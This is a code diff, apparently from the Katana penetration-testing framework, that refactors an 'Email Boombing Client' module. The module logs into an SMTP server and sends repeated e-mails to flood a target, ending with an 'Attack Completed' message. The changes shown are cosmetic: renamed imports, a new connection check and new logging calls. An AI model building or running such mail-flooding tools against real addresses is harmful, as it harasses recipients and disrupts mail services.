@@ -3,11 +3,10 @@
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core import                  #
-from core.KATANAFRAMEWORK import *    #
+from core.KatanaFramework import *    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
 # LIBRARIES 
-from core.Function import isLive
 import smtplib,sys,time
 # END LIBRARIES 
 
@@ -18,7 +17,7 @@ def init():
 	init.Description        ="Email Boombing Client."
 	init.CodeName           ="set/em.boom"
 	init.DateCreation       ="27/08/2015"      
-	init.LastModification   ="03/05/2016"
+	init.LastModification   ="25/12/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -49,7 +48,7 @@ def init():
 
 # CODE MODULE    ############################################################################################
 def main(run):
-	isLive(init.var['host'],init.var['port'])
+	NET.CheckConnectionHost(init.var['host'],init.var['port'],5)
 
 	try:
 		server = smtplib.SMTP(init.var['host'],int(init.var['port']))
@@ -69,15 +68,15 @@ def main(run):
 				printAlert(0,"#"+str(many)+" E-Mail was sent.")
 				time.sleep(int(init.var['sleep']))
 		except:
-			printAlert(1,"E-Mail not was sent.")
-		printAlert(3,"Attack Completed.")
+			printk.err("E-Mail not was sent.")
+		printk.suff("Attack Completed.")
 		server.quit()
 	except smtplib.SMTPAuthenticationError:
-		printAlert(1,"Authentication Required or Authentication went wrong.")
+		printk.err("Authentication Required or Authentication went wrong.")
 	except:
 		error = str(sys.exc_info()[1])
 		if error.find("SMTP AUTH extension") >= 0 : 
-			printAlert(1,"TLS error, Starting again with TLS.")
+			printk.err("TLS error, Starting again with TLS.")
 			init.var['tls'] = ["true",False,'TLS Auth']
 			main(False)
 
